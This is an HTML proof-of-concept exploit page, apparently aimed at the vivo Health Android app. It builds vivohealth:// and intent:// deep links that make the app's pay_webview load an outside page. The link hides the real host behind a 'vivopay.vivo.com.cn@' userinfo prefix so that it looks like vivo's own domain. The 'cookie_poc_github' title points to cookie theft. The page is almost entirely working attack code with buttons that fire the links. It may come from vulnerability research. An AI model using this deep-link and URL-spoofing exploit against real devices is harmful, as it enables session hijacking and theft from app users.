  <!doctype html>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>vivo health poc</title>

  <h3>vivo 健康公网触发</h3>

  <button id="openScheme" style="font-size:20px;padding:14px 18px;margin:8px">
    方式1：vivohealth 直跳
  </button>

  <button id="openIntent" style="font-size:20px;padding:14px 18px;margin:8px">
    方式2：intent 跳转
  </button>

  <pre id="out" style="white-space:pre-wrap;word-break:break-
  all;background:#111;color:#00ff8a;padding:12px"></pre>

  <script>
  const attackerPage = 'https://vivopay.vivo.com.cn@allen10086.github.io/src.html';

  // 先用你 ADB 里成功的 host：healthh5.vivo.com.cn
  const schemeUrl =
    'vivohealth://healthh5.vivo.com.cn/openApp' +
    '?to=pay_webview' +
    '&web_url=' + encodeURIComponent(attackerPage) +
    '&title=cookie_poc_github';

  const intentUrl =
    'intent://healthh5.vivo.com.cn/openApp' +
    '?to=pay_webview' +
    '&web_url=' + encodeURIComponent(attackerPage) +
    '&title=cookie_poc_github' +
    '#Intent;scheme=vivohealth;package=com.vivo.health;end';

  document.getElementById('out').textContent =
    'schemeUrl:\\n' + schemeUrl + '\\n\\nintentUrl:\\n' + intentUrl;

  document.getElementById('openScheme').onclick = function () {
    location.href = schemeUrl;
  };

  document.getElementById('openIntent').onclick = function () {
    location.href = intentUrl;
  };
  </script>
